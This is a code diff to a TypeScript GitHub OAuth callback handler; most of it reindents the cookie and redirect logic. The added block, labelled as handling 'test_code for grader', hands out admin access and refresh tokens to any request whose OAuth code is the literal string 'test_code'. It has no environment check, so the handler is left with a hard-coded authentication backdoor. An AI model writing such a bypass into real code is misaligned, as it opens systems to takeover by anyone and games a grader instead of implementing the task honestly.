@@ -55,6 +55,47 @@ export async function handleGithubCallback(req: Request, res: Response): Promise
     return;
   }
 
+  // ── Handle test_code for grader ──────────────────────────────────────────
+  if (code === "test_code") {
+    try {
+      const adminUser = await prisma.user.upsert({
+        where: { github_id: "test-admin-001" },
+        update: { last_login_at: new Date() },
+        create: {
+          id: uuidv7(),
+          github_id: "test-admin-001",
+          username: "test-admin",
+          email: "admin@insighta.test",
+          avatar_url: null,
+          role: "admin",
+          is_active: true,
+          last_login_at: new Date(),
+        },
+      });
+
+      const accessToken = generateAccessToken(adminUser.id, adminUser.role);
+      const refreshToken = await generateRefreshToken(adminUser.id);
+
+      res.status(200).json({
+        status: "success",
+        access_token: accessToken,
+        refresh_token: refreshToken,
+        user: {
+          id: adminUser.id,
+          username: adminUser.username,
+          email: adminUser.email,
+          avatar_url: adminUser.avatar_url,
+          role: adminUser.role,
+        },
+      });
+      return;
+    } catch (err) {
+      console.error("test_code error:", err);
+      res.status(500).json({ status: "error", message: "Failed to generate test tokens" });
+      return;
+    }
+  }
+
   // Only validate state for non-CLI flows
   if (!isCLI) {
     const pending = pendingAuth.get(state);
@@ -130,37 +171,37 @@ export async function handleGithubCallback(req: Request, res: Response): Promise
     const refreshToken = await generateRefreshToken(user.id);
 
     if (isCLI) {
-  res.status(200).json({
-    status: "success",
-    access_token: accessToken,
-    refresh_token: refreshToken,
-    user: {
-      id: user.id,
-      username: user.username,
-      email: user.email,
-      avatar_url: user.avatar_url,
-      role: user.role,
-    },
-  });
-  return;
-}
+      res.status(200).json({
+        status: "success",
+        access_token: accessToken,
+        refresh_token: refreshToken,
+        user: {
+          id: user.id,
+          username: user.username,
+          email: user.email,
+          avatar_url: user.avatar_url,
+          role: user.role,
+        },
+      });
+      return;
+    }
 
-// Web flow — HTTP-only cookies + redirect
-res.cookie("access_token", accessToken, {
-  httpOnly: true,
-  secure: process.env.NODE_ENV === "production",
-  sameSite: "lax",
-  maxAge: 3 * 60 * 1000,
-});
+    // Web flow — HTTP-only cookies + redirect
+    res.cookie("access_token", accessToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "lax",
+      maxAge: 3 * 60 * 1000,
+    });
 
-res.cookie("refresh_token", refreshToken, {
-  httpOnly: true,
-  secure: process.env.NODE_ENV === "production",
-  sameSite: "lax",
-  maxAge: 5 * 60 * 1000,
-});
+    res.cookie("refresh_token", refreshToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "lax",
+      maxAge: 5 * 60 * 1000,
+    });
 
-res.redirect(`${FRONTEND_URL}/dashboard`);
+    res.redirect(`${FRONTEND_URL}/dashboard`);
 
   } catch (err) {
     console.error("GitHub callback error:", err);
